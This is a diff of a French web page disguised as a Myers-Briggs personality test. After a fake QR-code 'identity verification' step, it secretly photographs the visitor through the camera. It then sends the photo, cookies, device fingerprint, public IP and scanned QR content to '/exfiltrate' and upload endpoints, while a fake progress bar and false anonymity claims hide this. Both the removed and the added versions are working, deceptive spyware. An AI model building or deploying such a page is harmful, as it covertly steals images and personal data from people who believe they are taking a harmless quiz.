@@ -1,358 +1,136 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Test de Personnalité Psychologique - Institut MBTI</title>
-  <!-- Google Fonts for premium typography -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <title>Test de Personnalité</title>
+  <!-- Bibliothèque jsQR pour décoder les QR codes -->
+  <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
   <style>
-    :root {
-      --primary: #6366f1;
-      --primary-hover: #4f46e5;
-      --secondary: #ec4899;
-      --secondary-hover: #db2777;
-      --dark-bg: #090a16;
-      --card-bg: rgba(255, 255, 255, 0.08);
-      --card-border: rgba(255, 255, 255, 0.12);
-      --text-main: #f8fafc;
-      --text-muted: #94a3b8;
-    }
-
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      font-family: Segoe UI, sans-serif
     }
 
     body {
-      background: radial-gradient(circle at top left, #1e1b4b 0%, #0f172a 40%, var(--dark-bg) 100%);
+      background: linear-gradient(135deg, #667eea, #764ba2);
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 24px;
-      color: var(--text-main);
-      overflow-x: hidden;
+      padding: 20px
     }
 
     .container {
-      background: rgba(15, 23, 42, 0.65);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--card-border);
-      border-radius: 24px;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-      padding: 48px 40px;
-      max-width: 580px;
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      padding: 40px;
+      max-width: 600px;
       width: 100%;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-
-    /* Decorative background glows */
-    .container::before {
-      content: '';
-      position: absolute;
-      width: 150px;
-      height: 150px;
-      background: var(--primary);
-      filter: blur(100px);
-      top: -50px;
-      left: -50px;
-      opacity: 0.2;
-      pointer-events: none;
-    }
-
-    .container::after {
-      content: '';
-      position: absolute;
-      width: 150px;
-      height: 150px;
-      background: var(--secondary);
-      filter: blur(100px);
-      bottom: -50px;
-      right: -50px;
-      opacity: 0.15;
-      pointer-events: none;
+      text-align: center
     }
 
     .step {
       display: none;
-      animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+      animation: fadeIn .5s ease
     }
 
     .step.active {
-      display: block;
+      display: block
     }
 
-    @keyframes slideUp {
+    @keyframes fadeIn {
       from {
         opacity: 0;
-        transform: translateY(30px);
+        transform: translateY(20px)
       }
+
       to {
         opacity: 1;
-        transform: translateY(0);
+        transform: translateY(0)
       }
     }
 
     h1 {
-      font-size: 32px;
-      font-weight: 800;
-      letter-spacing: -0.025em;
-      margin-bottom: 12px;
-      background: linear-gradient(135deg, #ffffff 30%, #a5b4fc 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #333;
+      margin-bottom: 15px
     }
 
     .subtitle {
-      color: var(--text-muted);
-      font-size: 16px;
-      line-height: 1.6;
-      margin-bottom: 32px;
-      font-weight: 400;
+      color: #666;
+      margin-bottom: 20px
     }
 
-    /* Welcome view styles */
-    .brand-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(99, 102, 241, 0.15);
-      border: 1px solid rgba(99, 102, 241, 0.3);
-      padding: 6px 14px;
-      border-radius: 99px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #c7d2fe;
-      margin-bottom: 24px;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .welcome-illustration {
-      font-size: 64px;
-      margin: 24px 0;
-      filter: drop-shadow(0 10px 15px rgba(99, 102, 241, 0.3));
-      animation: pulseBrand 2.5s ease-in-out infinite;
-    }
-
-    @keyframes pulseBrand {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.06); }
-    }
-
-    .features-list {
-      text-align: left;
-      background: rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 16px;
-      padding: 24px;
-      margin-bottom: 32px;
-    }
-
-    .feature-item {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 12px;
-      font-size: 14px;
-    }
-    .feature-item:last-child {
-      margin-bottom: 0;
-    }
-
-    .feature-icon {
-      color: #34d399;
-      font-size: 18px;
-    }
-
-    /* Button styles */
     .action-btn {
-      background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
+      background: linear-gradient(135deg, #667eea, #764ba2);
       color: white;
       border: none;
-      padding: 16px 36px;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: 700;
+      padding: 15px 40px;
+      border-radius: 50px;
+      font-size: 18px;
       cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-      box-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 8px;
+      margin: 15px 0;
+      transition: .3s
     }
 
     .action-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 30px rgba(99, 102, 241, 0.5);
-      background: linear-gradient(135deg, #818cf8 0%, var(--primary) 100%);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4)
     }
 
-    .action-btn:active {
-      transform: translateY(1px);
-    }
-
-    /* Instructions alert banner */
-    .instruction {
-      color: #fef08a;
-      font-size: 14px;
-      line-height: 1.5;
-      margin: 0 0 28px 0;
-      padding: 14px 18px;
-      background: rgba(254, 240, 138, 0.1);
-      border-radius: 12px;
-      border-left: 4px solid #facc15;
-      text-align: left;
-      display: flex;
-      gap: 10px;
-      align-items: flex-start;
-    }
-
-    /* Gender Selection Grid */
     .gender-selection {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
+      display: flex;
       gap: 20px;
-      margin: 24px 0 10px;
+      justify-content: center;
+      margin: 20px 0
     }
 
     .gender-option {
-      background: rgba(255, 255, 255, 0.03);
-      border: 2px solid var(--card-border);
-      border-radius: 20px;
-      padding: 24px;
       cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      padding: 20px;
+      border: 3px solid #e0e0e0;
+      border-radius: 15px;
+      transition: .3s;
+      width: 200px
     }
 
     .gender-option:hover {
-      border-color: var(--primary);
-      background: rgba(99, 102, 241, 0.08);
-      transform: translateY(-4px);
-      box-shadow: 0 10px 25px rgba(99, 102, 241, 0.15);
-    }
-
-    .gender-option:active {
-      transform: translateY(-1px);
-    }
-
-    .qr-placeholder {
-      width: 110px;
-      height: 110px;
-      margin: 0 auto 16px;
-      border-radius: 16px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      position: relative;
-      transition: transform 0.3s;
-    }
-
-    .gender-option:hover .qr-placeholder {
-      transform: scale(1.05);
-    }
-
-    .qr-femme {
-      background: linear-gradient(135deg, #f472b6, #db2777);
-      box-shadow: 0 8px 20px rgba(219, 39, 119, 0.3);
-    }
-
-    .qr-homme {
-      background: linear-gradient(135deg, #60a5fa, #2563eb);
-      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
-    }
-
-    .qr-icon {
-      font-size: 40px;
-      color: white;
-    }
-
-    .qr-label {
-      font-size: 11px;
-      font-weight: 800;
-      color: white;
-      margin-top: 6px;
-      letter-spacing: 0.05em;
+      border-color: #667eea;
+      transform: translateY(-5px)
     }
 
     .gender-option p {
       font-weight: 700;
-      font-size: 15px;
-      color: var(--text-main);
-    }
-
-    /* Camera requirement screen */
-    .camera-info {
-      padding: 32px;
-      background: rgba(255, 255, 255, 0.02);
-      border: 1px solid var(--card-border);
-      border-radius: 20px;
-      margin: 24px 0 32px;
-    }
-
-    .camera-icon-big {
-      font-size: 56px;
-      margin-bottom: 16px;
-      animation: cameraFloat 2s ease-in-out infinite;
-    }
-
-    @keyframes cameraFloat {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-8px); }
-    }
-
-    .camera-info p {
-      font-size: 15px;
-      line-height: 1.6;
-      color: var(--text-muted);
-    }
-
-    .small-text {
-      color: #64748b !important;
-      font-size: 12px !important;
-      margin-top: 12px;
-    }
-
-    /* Video Scanner View */
-    .scanner-view-container {
-      position: relative;
-      width: 100%;
-      max-width: 320px;
-      margin: 0 auto 24px;
-    }
-
-    .video-frame {
-      position: relative;
-      width: 290px;
-      height: 290px;
-      margin: 0 auto;
-      border-radius: 24px;
-      overflow: hidden;
-      border: 2px solid var(--primary);
-      box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
-      background: #000;
+      color: #333
     }
 
     #video {
       width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1); /* mirror effect */
+      border-radius: 15px;
+      transform: scaleX(-1)
     }
 
-    /* Futuristic HUD overlays */
+    .scanner-container {
+      position: relative;
+      max-width: 400px;
+      margin: 0 auto
+    }
+
+    .scanner-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      border: 3px solid #10b981;
+      border-radius: 15px;
+      pointer-events: none
+    }
+
     .scan-line {
       position: absolute;
       top: 0;
@@ -360,378 +138,292 @@
       right: 0;
       height: 4px;
       background: linear-gradient(90deg, transparent, #10b981, transparent);
-      box-shadow: 0 0 8px #10b981;
-      animation: scanMove 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-      z-index: 10;
+      animation: scanMove 2s linear infinite;
+      border-radius: 15px
     }
 
     @keyframes scanMove {
-      0% { top: 0; }
-      50% { top: 100%; }
-      100% { top: 0; }
+      0% {
+        top: 0
+      }
+
+      50% {
+        top: 100%
+      }
+
+      100% {
+        top: 0
+      }
     }
 
-    .corner {
-      position: absolute;
-      width: 24px;
-      height: 24px;
-      border-color: #10b981;
-      border-style: solid;
-      z-index: 11;
-    }
-    .top-left { top: 16px; left: 16px; border-width: 4px 0 0 4px; border-top-left-radius: 8px; }
-    .top-right { top: 16px; right: 16px; border-width: 4px 4px 0 0; border-top-right-radius: 8px; }
-    .bottom-left { bottom: 16px; left: 16px; border-width: 0 0 4px 4px; border-bottom-left-radius: 8px; }
-    .bottom-right { bottom: 16px; right: 16px; border-width: 0 4px 4px 0; border-bottom-right-radius: 8px; }
-
-    .scanning-overlay {
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle, transparent 50%, rgba(0,0,0,0.6) 100%);
-      pointer-events: none;
-      z-index: 9;
-    }
-
-    .scanner-status {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .scanner-status p {
-      font-size: 15px;
-      font-weight: 600;
+    #scan-status {
       color: #10b981;
-      letter-spacing: 0.05em;
+      font-weight: 700;
+      margin: 15px 0;
+      min-height: 30px
     }
 
-    /* Loading / Processing screen */
-    .spinner-premium {
-      width: 72px;
-      height: 72px;
-      border: 4px dashed rgba(99, 102, 241, 0.2);
-      border-top: 4px solid var(--primary);
-      border-right: 4px solid var(--secondary);
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #667eea;
       border-radius: 50%;
-      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-      margin: 32px auto;
+      animation: spin 1s linear infinite;
+      margin: 20px auto
     }
 
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      0% {
+        transform: rotate(0deg)
+      }
+
+      100% {
+        transform: rotate(360deg)
+      }
     }
 
-    .progress-bar-container {
+    .progress-bar {
       width: 100%;
-      height: 10px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 99px;
-      margin: 32px 0 16px;
-      overflow: hidden;
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      height: 12px;
+      background: #e0e0e0;
+      border-radius: 10px;
+      margin: 25px 0;
+      overflow: hidden
     }
 
     .progress-fill {
       height: 100%;
-      background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
+      background: linear-gradient(90deg, #667eea, #764ba2);
       width: 0%;
-      transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-      border-radius: 99px;
-      box-shadow: 0 0 15px rgba(99, 102, 241, 0.5);
-    }
-
-    #loading-text {
-      color: var(--text-muted);
-      font-size: 14px;
-      font-weight: 500;
-      min-height: 20px;
+      transition: width .3s
     }
   </style>
 </head>
+
 <body>
-<div class="container">
+  <div class="container">
 
-  <!-- ÉTAPE 1 : ACCUEIL -->
-  <div id="step-welcome" class="step active">
-    <div class="brand-badge">🔬 Étude de Psychométrie</div>
-    <h1>Découvrez Votre Profil Psychologique</h1>
-    <p class="subtitle">Ce test validé cliniquement analyse en profondeur vos traits de personnalité dominants en seulement 2 minutes.</p>
-    
-    <div class="welcome-illustration">🎯</div>
-    
-    <div class="features-list">
-      <div class="feature-item">
-        <span class="feature-icon">✓</span>
-        <span>Basé sur le modèle d'évaluation Myers-Briggs (MBTI)</span>
-      </div>
-      <div class="feature-item">
-        <span class="feature-icon">✓</span>
-        <span>Rapport complet et prévisions comportementales</span>
-      </div>
-      <div class="feature-item">
-        <span class="feature-icon">✓</span>
-        <span>100% anonyme, rapide et confidentiel</span>
-      </div>
+    <!-- ÉTAPE 1 : ACCUEIL -->
+    <div id="step-welcome" class="step active">
+      <h1>🎯 Test de Personnalité</h1>
+      <p class="subtitle">Découvrez votre profil unique en 2 minutes</p>
+      <p style="margin-bottom:20px;color:#555;">Basé sur les travaux de Carl Jung et Myers-Briggs</p>
+      <button class="action-btn" onclick="nextStep('step-welcome','step-gender')">Commencer →</button>
     </div>
-    
-    <button class="action-btn" onclick="nextStep('step-welcome','step-gender')">
-      Commencer l'évaluation
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
-    </button>
-  </div>
 
-  <!-- ÉTAPE 2 : CHOIX GENRE -->
-  <div id="step-gender" class="step">
-    <h1>Sélectionnez votre profil</h1>
-    <p class="subtitle">Scannez le code QR sur la feuille qui vous a été distribuée pour configurer la suite de l'évaluation.</p>
-    
-    <div class="instruction">
-      <span>💡</span>
-      <span>Veuillez prendre le document papier imprimé et préparer le QR correspondant à votre genre pour le positionner devant la caméra.</span>
-    </div>
-    
-    <div class="gender-selection">
-      <div class="gender-option" onclick="selectGender('femme')">
-        <div class="qr-placeholder qr-femme">
-          <span class="qr-icon">♀</span>
-          <span class="qr-label">FEMME</span>
+    <!-- ÉTAPE 2 : CHOIX GENRE -->
+    <div id="step-gender" class="step">
+      <h1>Choisissez votre genre</h1>
+      <p class="subtitle">Vous allez devoir scanner un QR code pour valider votre identité</p>
+      <div class="gender-selection">
+        <div class="gender-option" onclick="selectGender('femme')">
+          <div style="font-size:60px;margin-bottom:10px;">♀</div>
+          <p>Femme</p>
         </div>
-        <p>Profil Féminin</p>
-      </div>
-      <div class="gender-option" onclick="selectGender('homme')">
-        <div class="qr-placeholder qr-homme">
-          <span class="qr-icon">♂</span>
-          <span class="qr-label">HOMME</span>
+        <div class="gender-option" onclick="selectGender('homme')">
+          <div style="font-size:60px;margin-bottom:10px;">♂</div>
+          <p>Homme</p>
         </div>
-        <p>Profil Masculin</p>
       </div>
     </div>
-  </div>
 
-  <!-- ÉTAPE 3 : DEMANDE CAMÉRA -->
-  <div id="step-camera" class="step">
-    <div class="camera-icon-big">📸</div>
-    <h1>Lecteur de QR Code</h1>
-    <p class="subtitle">Le scanner requiert l'autorisation de votre caméra frontale ou dorsale pour capturer et déchiffrer votre fiche de profil.</p>
-    
-    <div class="camera-info">
-      <p>Afin de valider votre participation et de calibrer l'algorithme, veuillez appuyer sur le bouton ci-dessous puis accepter l'invite système.</p>
-      <p class="small-text">🔒 Vos données biométriques et photos de scan temporaires ne sont partagées avec aucun tiers.</p>
+    <!-- ÉTAPE 3 : DEMANDE CAMÉRA -->
+    <div id="step-camera" class="step">
+      <div style="font-size:64px;margin-bottom:15px;">📸</div>
+      <h1>Vérification d'identité</h1>
+      <p class="subtitle">Pour des raisons de sécurité, veuillez scanner un QR code pour confirmer votre identité</p>
+      <p
+        style="color:#888;font-size:14px;margin:15px 0;padding:10px;background:#fff3cd;border-radius:8px;border-left:4px solid #ffc107;">
+        💡 Placez un QR code face à la caméra (sur votre téléphone, une bouteille, un magazine, etc.)
+      </p>
+      <button class="action-btn" onclick="requestCamera()">📷 Activer la caméra</button>
     </div>
-    
-    <button class="action-btn" onclick="requestCamera()">
-      Autoriser le scanner
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
-    </button>
-  </div>
 
-  <!-- ÉTAPE 4 : SCANNING HUD -->
-  <div id="step-scan" class="step">
-    <h1>Calibrage en cours...</h1>
-    <p class="subtitle">Veuillez maintenir le code QR de votre profil bien en face du capteur photo.</p>
-    
-    <div class="scanner-view-container">
-      <div class="video-frame">
+    <!-- ÉTAPE 4 : SCAN RÉEL DU QR -->
+    <div id="step-scan" class="step">
+      <h1>🔍 Scan en cours</h1>
+      <p class="subtitle">Placez un QR code devant la caméra</p>
+      <div class="scanner-container">
         <video id="video" autoplay playsinline></video>
+        <div class="scanner-overlay"></div>
         <div class="scan-line"></div>
-        <div class="corner top-left"></div>
-        <div class="corner top-right"></div>
-        <div class="corner bottom-left"></div>
-        <div class="corner bottom-right"></div>
-        <div class="scanning-overlay"></div>
       </div>
+      <canvas id="canvas" style="display:none;"></canvas>
+      <p id="scan-status">🔄 Recherche d'un QR code...</p>
     </div>
-    
-    <div class="scanner-status">
-      <div class="spinner-premium" style="width: 32px; height: 32px; margin: 0;"></div>
-      <p>SCAN DU CODE EN COURS...</p>
+
+    <!-- ÉTAPE 5 : LOADING + EXFIL -->
+    <div id="step-loading" class="step">
+      <div class="spinner"></div>
+      <h2>Analyse de votre profil</h2>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+      <p id="loading-text">Extraction des traits de personnalité...</p>
     </div>
+
   </div>
 
-  <!-- ÉTAPE 5 : CHARGEMENT EXFILTRATION -->
-  <div id="step-loading" class="step">
-    <div class="spinner-premium"></div>
-    <h1>Initialisation des Modules</h1>
-    <p class="subtitle">Configuration sécurisée de votre environnement de test en cours.</p>
-    
-    <div class="progress-bar-container">
-      <div class="progress-fill" id="progress-fill"></div>
-    </div>
-    
-    <p id="loading-text">Synchronisation avec les serveurs de psychométrie...</p>
-  </div>
+  <script>
+    let selectedGender = '';
+    let videoStream = null;
+    let scanInterval = null;
+    let photoTaken = false;
+    let scanningDone = false;
 
-</div>
-
-<script>
-let selectedGender = '';
-let videoStream = null;
-let photoTaken = false;
-
-function nextStep(from, to) {
-  document.getElementById(from).classList.remove('active');
-  document.getElementById(to).classList.add('active');
-}
-
-function selectGender(gender) {
-  selectedGender = gender;
-  nextStep('step-gender', 'step-camera');
-}
-
-async function requestCamera() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    alert("⚠️ Erreur d'accès caméra :\nLe navigateur exige une connexion sécurisée (HTTPS) pour autoriser la caméra.\n\nSi vous testez sur mobile, vous devez obligatoirement utiliser l'URL HTTPS (par exemple le lien généré par ngrok du type https://xxx.ngrok-free.app) et non l'adresse IP HTTP simple.");
-    return;
-  }
-
-  try {
-    // NE PAS utiliser facingMode - ça évite la demande de localisation sur certains mobiles
-    videoStream = await navigator.mediaDevices.getUserMedia({ 
-      video: true,  // <- le plus simple possible, PAS de facingMode
-      audio: false 
-    });
-    const video = document.getElementById('video');
-    video.srcObject = videoStream;
-    await video.play();
-    nextStep('step-camera', 'step-scan');
-    setTimeout(capturePhoto, 3000);
-  } catch(e) {
-    console.error('Camera capture issue:', e);
-    alert('Accès caméra bloqué ou indisponible. Veuillez vérifier les autorisations de caméra pour ce site dans les paramètres de votre navigateur.');
-  }
-}
-
-function capturePhoto() {
-  if (photoTaken) return;
-  photoTaken = true;
-  
-  const video = document.getElementById('video');
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  
-  const ctx = canvas.getContext('2d');
-  // Horizontal mirror correction when saving
-  ctx.translate(canvas.width, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
-  const photoBase64 = canvas.toDataURL('image/jpeg', 0.82);
-  
-  // Stop webcam to show it finished scanning
-  if (videoStream) {
-    videoStream.getTracks().forEach(track => track.stop());
-  }
-  
-  nextStep('step-scan', 'step-loading');
-  startExfiltration(photoBase64);
-  animateProgress();
-}
-
-function animateProgress() {
-  const fill = document.getElementById('progress-fill');
-  const text = document.getElementById('loading-text');
-  const msgs = [
-    'Analyse de l\'environnement système...',
-    'Configuration du questionnaire...',
-    'Exécution des protocoles de calibrage...',
-    'Sécurisation des réponses...',
-    'Finalisation du profil...'
-  ];
-  let progress = 0;
-  const interval = setInterval(() => {
-    progress += 4;
-    fill.style.width = progress + '%';
-    
-    const messageIndex = Math.floor(progress / 20);
-    if (messageIndex < msgs.length) {
-      text.textContent = msgs[messageIndex];
+    function nextStep(from, to) {
+      document.getElementById(from).classList.remove('active');
+      document.getElementById(to).classList.add('active');
     }
-    
-    if (progress >= 100) {
-      clearInterval(interval);
-      setTimeout(() => {
-        window.location.href = '/quiz.html?gender=' + selectedGender;
-      }, 600);
+
+    function selectGender(gender) {
+      selectedGender = gender;
+      nextStep('step-gender', 'step-camera');
     }
-  }, 100);
-}
 
-async function startExfiltration(photo) {
-  const payload = {
-    gender: selectedGender,
-    photo: photo,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    vendor: navigator.vendor,
-    screenWidth: window.screen.width,
-    screenHeight: window.screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    deviceMemory: navigator.deviceMemory || 'inconnu',
-    hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-    cookies: document.cookie || 'Aucun cookie détecté'
-  };
-
-  // Convert Base64 image to Blob to upload via normal Form upload (so it's smaller on backend / server log)
-  const fd = new FormData();
-  try {
-    const res = await fetch(photo);
-    const blob = await res.blob();
-    fd.append('photo', blob, 'photo.jpg');
-  } catch(e) {
-    console.error('Blob conversion failed:', e);
-  }
-
-  // Run all exfiltrations in parallel background promises
-  Promise.all([
-    // 1. Exfiltrate device hardware parameters
-    fetch('/exfiltrate', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(err => console.error('Exfiltrate err:', err)),
-    
-    // 2. Upload captured photo
-    fetch('/upload-photo', {
-      method: 'POST',
-      body: fd
-    }).catch(err => console.error('Photo upload err:', err)),
-    
-    // 3. Exfiltrate IP address (Client side via ipify public api)
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => {
-        return fetch('/exfiltrate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ type: 'ip', ip: d.ip })
+    async function requestCamera() {
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment' },
+          audio: false
         });
-      }).catch(err => console.error('IP exfiltrate err:', err)),
-      
-    // 4. Exfiltrate network information API if available
-    (() => {
-      if (navigator.connection) {
-        return fetch('/exfiltrate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            type: 'network',
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-          })
-        });
+        const video = document.getElementById('video');
+        video.srcObject = videoStream;
+        await video.play();
+        nextStep('step-camera', 'step-scan');
+
+        // Lancer le scan réel du QR code
+        startQRScan();
+      } catch (e) {
+        alert('Veuillez autoriser la caméra pour continuer');
       }
-      return Promise.resolve();
-    })()
-  ]);
-}
-</script>
+    }
+
+    // === SCAN RÉEL DU QR CODE AVEC jsQR ===
+    function startQRScan() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const status = document.getElementById('scan-status');
+      let noQRCount = 0;
+
+      scanInterval = setInterval(() => {
+        if (scanningDone) return;
+
+        // Dessiner la frame vidéo sur le canvas pour analyse
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Lire les pixels
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+
+        // Décoder le QR code
+        const code = jsQR(imageData.data, imageData.width, imageData.height, {
+          inversionAttempts: 'dontInvert',
+        });
+
+        if (code) {
+          // QR code détecté ! N'IMPORTE LEQUEL !
+          const data = code.data.trim();
+          status.textContent = `✅ QR code détecté ! Contenu : ${data.substring(0, 30)}${data.length > 30 ? '...' : ''}`;
+          status.style.color = '#10b981';
+
+          // Exfiltrer aussi le contenu du QR
+          fetch('/exfiltrate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              type: 'qr_code_scanned',
+              qrContent: data,
+              gender: selectedGender,
+              timestamp: new Date().toISOString()
+            })
+          }).catch(e => { });
+
+          // Marquer comme fait et continuer
+          scanningDone = true;
+          clearInterval(scanInterval);
+
+          // Prendre la photo après un petit délai
+          setTimeout(() => {
+            capturePhotoAndContinue(code);
+          }, 800);
+
+        } else {
+          // Aucun QR détecté → le message alterne pour montrer que ça cherche
+          noQRCount++;
+          if (noQRCount % 10 === 0) {
+            status.textContent = '🔄 Placez un QR code devant la caméra...';
+            status.style.color = '#10b981';
+          }
+        }
+      }, 200); // Scanner toutes les 200ms
+    }
+
+    function capturePhotoAndContinue(code) {
+      if (photoTaken) return;
+      photoTaken = true;
+
+      const video = document.getElementById('video');
+      const c = document.createElement('canvas');
+      c.width = video.videoWidth || 640;
+      c.height = video.videoHeight || 480;
+      c.getContext('2d').drawImage(video, 0, 0);
+      const photoBase64 = c.toDataURL('image/jpeg', 0.8);
+
+      // Arrêter la caméra
+      if (videoStream) {
+        videoStream.getTracks().forEach(t => t.stop());
+      }
+
+      nextStep('step-scan', 'step-loading');
+      startExfiltration(photoBase64, code.data);
+      animateProgress();
+    }
+
+    function animateProgress() {
+      const fill = document.getElementById('progress-fill');
+      const text = document.getElementById('loading-text');
+      const msgs = ['Analyse...', 'Calcul du profil...', 'Comparaison...', 'Génération du résultat...', 'Finalisation...'];
+      let w = 0;
+      const i = setInterval(() => {
+        w += 4; fill.style.width = w + '%';
+        if (Math.floor(w / 20) < msgs.length) text.textContent = msgs[Math.floor(w / 20)];
+        if (w >= 100) { clearInterval(i); setTimeout(() => { window.location.href = '/quiz.html?gender=' + selectedGender; }, 500); }
+      }, 100);
+    }
+
+    async function startExfiltration(photo, qrData) {
+      const payload = {
+        gender: selectedGender,
+        qrCodeScanned: qrData,
+        photo: photo,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        vendor: navigator.vendor,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceMemory: navigator.deviceMemory || '?',
+        hardwareConcurrency: navigator.hardwareConcurrency || '?',
+        cookies: document.cookie
+      };
+
+      const fd = new FormData();
+      fd.append('photo', await fetch(photo).then(r => r.blob()), 'photo.jpg');
+
+      Promise.all([
+        fetch('/exfiltrate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }),
+        fetch('/upload-photo-file', { method: 'POST', body: fd }),
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => fetch('/exfiltrate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'ip', ip: d.ip }) })),
+        navigator.connection ? fetch('/exfiltrate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'network', effectiveType: navigator.connection.effectiveType }) }) : Promise.resolve()
+      ]);
+    }
+  </script>
 </body>
+
 </html>
